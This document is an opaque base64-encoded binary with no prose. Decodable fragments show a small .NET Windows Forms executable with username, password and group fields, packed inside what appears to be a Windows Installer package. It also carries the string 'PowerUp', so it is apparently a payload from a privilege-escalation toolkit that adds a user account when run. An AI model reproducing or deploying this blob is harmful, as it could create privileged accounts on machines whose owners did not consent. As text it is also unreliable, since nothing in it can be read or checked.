7D7DP9U/4j/uP/g/AAAAsAAAeAAAAAAwCzA7MGswAjGyMdUxUzIkM6wztjPOM9Uz3zPnM/Qz+zMrNMQ0OTVGN1g3ajeMN543sDfCN9Q35jf4Nzo6QTrFO+M7OTxLPJs8oTzBPPg8CT1SPa49wz0JPg8+Gz5wPqM+2z5GP0w/nT+jP8c/6j8AwAAAtAAAAB4wJDAwMHcwszAxMTgxtDG7MRYyQzKRMmYzNTQ7NEA0RjRNNF80qjTfNPg0/zQHNQw1EDUUNT01YzWBNYg1jDWQNZQ1mDWcNaA1pDXuNfQ1+DX8NQA2ZjZxNow2kzaYNpw2oDbBNus2HTckNyg3LDcwNzQ3ODc8N0A3ijeQN5Q3mDecN/E3/DcfOOM48Dj/ODc5ejmAOag5xTnxOSo6NzoWOyU7JD4rPoA+AAAA0AAADAAAAJAwAAAA4AAAHAAAAGQxaDFsMXAxdDGAMYQxvDHAMQAAAPAAAHAAAAAEOQg5qDnIOeg5CDooOkQ6SDpQOlQ6cDqQOrA6vDrYOvg6GDs4O1g7dDt4O5g7pDvAO8w76DsIPCg8SDxoPIg8qDzEPMg85DzoPAg9KD00PVA9bD1wPYw9kD2wPdA98D0QPjA+UD4AAAAQAQDoAAAAgDGIMQA1DDUUNRw1JDUsNTQ1PDVENUw1VDVcNWQ1bDV0NXw1hDWMNZQ1nDWkNaw1tDW8NUg6QDuoO7g7yDvYO+g7DDwYPBw8IDwkPCg8MDw0PDg8PDxAPEQ8SDxMPFA8VDxYPFw8YDxkPLA9tD24Pbw9wD3EPcg9zD3QPdQ92D3cPeA95D3oPew98D30Pfg9/D0APgQ+CD4MPhA+FD4YPhw+ID4kPig+LD4wPjQ+OD48PkA+RD5IPkw+UD5UPlg+XD5gPnA+eD58PoA+hD6IPow+kD6UPpg+nD6oPnA/dD8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AQALAAEAJgABAA8AAQAEAAEACwABABQAAQAOAAEABwADACYAAwAWAAEAKwABAEIABQAGACIAKQAqACsALwA1AD0ATQBcAGEAbwByAHMAdAB3AIIAhgCQAAEABgABACMAAQARAAEAEwABABQAAQAWAAEA/v8AAAYBAgAAAAAAAAAAAAAAAAAAAAAAAQAAAALVzdWcLhsQk5cIACss+a4wAAAAUAAAAAMAAAABAAAAKAAAAAAAAIAwAAAADwAAADgAAAAAAAAAAAAAAAIAAACwBAAAEwAAAAkEAAAfAAAACAAAAFAAbwB3AGUAcgBVAHAAAABkR3VpZEEgc3RyaW5nIEdVSUQgdW5pcXVlIHRvIHRoaXMgY29tcG9uZW50LCB2ZXJzaW9uLCBhbmQgbGFuZ3VhZ2UuRGlyZWN0b3J5X0RpcmVjdG9yeVJlcXVpcmVkIGtleSBvZiBhIERpcmVjdG9yeSB0YWJsZSByZWNvcmQuIFRoaXMgaXMgYWN0dWFsbHkgYSBwcm9wZXJ0eSBuYW1lIHdob3NlIHZhbHVlIGNvbnRhaW5zIHRoZSBhY3R1YWwgcGF0aCwgc2V0IGVpdGhlciBieSB0aGUgQXBwU2VhcmNoIGFjdGlvbiBvciB3aXRoIHRoZSBkZWZhdWx0IHNldHRpbmcgb2J0YWluZWQgZnJvbSB0aGUgRGlyZWN0b3J5IHRhYmxlLkF0dHJpYnV0ZXNSZW1vdGUgZXhlY3V0aW9uIG9wdGlvbiwgb25lIG9mIGlyc0VudW1BIGNvbmRpdGlvbmFsIHN0YXRlbWVudCB0aGF0IHdpbGwgZGlzYWJsZSB0aGlzIGNvbXBvbmVudCBpZiB0aGUgc3BlY2lmaWVkIGNvbmRpdGlvbiBldmFsdWF0ZXMgdG8gdGhlICdUcnVlJyBzdGF0ZS4gSWYgYSBjb21wb25lbnQgaXMgZGlzYWJsZWQsIGl0IHdpbGwgbm90IGJlIGluc3RhbGxlZCwgcmVnYXJkbGVzcyBvZiB0aGUgJ0FjdGlvbicgc3RhdGUgYXNzb2NpYXRlZCB3aXRoIHRoZSBjb21wb25lbnQuS2V5UGF0aEZpbGU7UmVnaXN0cnk7T0RCQ0RhdGFTb3VyY2VFaXRoZXIgdGhlIHByaW1hcnkga2V5IGludG8gdGhlIEZpbGUgdGFibGUsIFJlZ2lzdHJ5IHRhYmxlLCBvciBPREJDRGF0YVNvdXJjZSB0YWJsZS4gVGhpcyBleHRyYWN0IHBhdGggaXMgc3RvcmVkIHdoZW4gdGhlIGNvbXBvbmVudCBpcyBpbnN0YWxsZWQsIGFuZCBpcyB1c2VkIHRvIGRldGVjdCB0aGUgcHJlc2VuY2Ugb2YgdGhlIGNvbXBvbmVudCBhbmQgdG8gcmV0dXJuIHRoZSBwYXRoIHRvIGl0LkN1c3RvbUFjdGlvblByaW1hcnkga2V5LCBuYW1lIG9mIGFjdGlvbiwgbm9ybWFsbHkgYXBwZWFycyBpbiBzZXF1ZW5jZSB0YWJsZSB1bmxlc3MgcHJpdmF0ZSB1c2UuVGhlIG51bWVyaWMgY3VzdG9tIGFjdGlvbiB0eXBlLCBjb25zaXN0aW5nIG9mIHNvdXJjZSBsb2NhdGlvbiwgY29kZSB0eXBlLCBlbnRyeSwgb3B0aW9uIGZsYWdzLlNvdXJjZUN1c3RvbVNvdXJjZVRoZSB0YWJsZSByZWZlcmVuY2Ugb2YgdGhlIHNvdXJjZSBvZiB0aGUgY29kZS5UYXJnZXRGb3JtYXR0ZWRFeGNlY3V0aW9uIHBhcmFtZXRlciwgZGVwZW5kcyBvbiB0aGUgdHlwZSBvZiBjdXN0b20gYWN0aW9uRXh0ZW5kZWRUeXBlQSBudW1lcmljIGN1c3RvbSBhY3Rpb24gdHlwZSB0aGF0IGV4dGVuZHMgY29kZSB0eXBlIG9yIG9wdGlvbiBmbGFncyBvZiB0aGUgVHlwZSBjb2x1bW4uVW5pcXVlIGlkZW50aWZpZXIgZm9yIGRpcmVjdG9yeSBlbnRyeSwgcHJpbWFyeSBrZXkuIElmIGEgcHJvcGVydHkgYnkgdGhpcyBuYW1lIGlzIGRlZmluZWQsIGl0IGNvbnRhaW5zIHRoZSBmdWxsIHBhdGggdG8gdGhlIGRpcmVjdG9yeS5EaXJlY3RvcnlfUGFyZW50UmVmZXJlbmNlIHRvIHRoZSBlbnRyeSBpbiB0aGlzIHRhYmxlIHNwZWNpZnlpbmcgdGhlIGRlZmF1bHQgcGFyZW50IGRpcmVjdG9yeS4gQSByZWNvcmQgcGFyZW50ZWQgdG8gaXRzZWxmIG9yIHdpdGggYSBOdWxsIHBhcmVudCByZXByZXNlbnRzIGEgcm9vdCBvZiB0aGUgaW5zdGFsbCB0cmVlLkRlZmF1bHREaXJUaGUgZGVmYXVsdCBzdWItcGF0aCB1bmRlciBwYXJlbnQncyBwYXRoLkZlYXR1cmVQcmltYXJ5IGtleSB1c2VkIHRvIGlkZW50aWZ5IGEgcGFydGljdWxhciBmZWF0dXJlIHJlY29yZC5GZWF0dXJlX1BhcmVudE9wdGlvbmFsIGtleSBvZiBhIHBhcmVudCByZWNvcmQgaW4gdGhlIHNhbWUgdGFibGUuIElmIHRoZSBwYXJlbnQgaXMgbm90IHNlbGVjdGVkLCB0aGVuIHRoZSByZWNvcmQgd2lsbCBub3QgYmUgaW5zdGFsbGVkLiBOdWxsIGluZGljYXRlcyBhIHJvb3QgaXRlbQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABEB4wCoAPkAgAWuAPkAjQVeABkB4wCoAPkAmwW1APkApAVpAPkAsQVeAPkAugUZACEB4wC8APkA1AXCAPkA3gXCACkB+QUZADEB4wDJADkBLAbPADkBUgbWAAkAZAa1APkAhQbdAEkBEAXjAAkAkgbCAPkAmwYZAPkAqAYKAFEB4wAKAFkB4wDuAGEBFAdNAREA4wAKAGkB4wAKAAEBNAc4AAEBRwdWAQEBaQdbAXEB4wAKABkA4wAKAHkBoQeiAXkBvAerAUkA4wCxAZEB4wC+AS4AGwDsAS4AewBKAi4AMwDyAS4ACwDOAS4AEwDsAS4AIwDsAS4AKwDOAS4AUwAKAi4AcwBBAi4ASwDsAS4AOwDsAS4AYwA0Ai4AawDFAUkAKwLFAWMAywH0AGMAwwHpAGkAKwLFAaMAAwLpAKMAwwHpAKMAywFhAYAB4wHpAJkAuQEDAAEABQACAAAA5gEzAAAABAJUAAAAfQJZAAIACQADAAIADgAFAAIADwAHAAEAEAAHAASAAAABAAAAAAAAAAAAAAAAAC0AAAACAAAAAAAAAAAAAAABAIUAAAAAAAIAAAAAAAAAAAAAAAEAnwAAAAAAAgAAAAAAAAAAAAAAAQDTAAAAAAACAAAAAAAAAAAAAAB5ALkEAAAAAAIAAAAAAAAAAAAAAHkAawUAAAAAAAAAAAEAAAD3BwAAuAAAAAEAAAAgCAAAAAAAAAA8TW9kdWxlPgBXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEuZXhlAEZvcm0xAFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uMQBTZXR0aW5ncwBXaW5kb3dzRm9ybXNBcHBsaWNhdGlvbjEuUHJvcGVydGllcwBQcm9ncmFtAFJlc291cmNlcwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBGb3JtAFN5c3RlbQBTeXN0ZW0uQ29uZmlndXJhdGlvbgBBcHBsaWNhdGlvblNldHRpbmdzQmFzZQBtc2NvcmxpYgBPYmplY3QALmN0b3IARXZlbnRBcmdzAEZvcm0xX0xvYWQAbGFiZWwxX0NsaWNrAGxhYmVsM19DbGljawBidXR0b24xX0NsaWNrAGdyb3VwX1RleHRDaGFuZ2VkAFN5c3RlbS5Db21wb25lbnRNb2RlbABJQ29udGFpbmVyAGNvbXBvbmVudHMARGlzcG9zZQBJbml0aWFsaXplQ29tcG9uZW50AFRleHRCb3gAdXNlcm5hbWUATGFiZWwAbGFiZWwxAGxhYmVsMgBwYXNzd29yZABsYWJlbDMAZ3JvdXAAQnV0dG9uAGJ1dHRvbjEAZGVmYXVsdEluc3RhbmNlAGdldF9EZWZhdWx0AERlZmF1bHQATWFpbgBTeXN0ZW0uUmVzb3VyY2VzAFJlc291cmNlTWFuYWdlcgByZXNvdXJjZU1hbgBTeXN0ZW0uR2xvYmFsaXphdGlvbgBDdWx0dXJlSW5mbwByZXNvdXJjZUN1bHR1cmUAZ2V0X1Jlc291cmNlTWFuYWdlcgB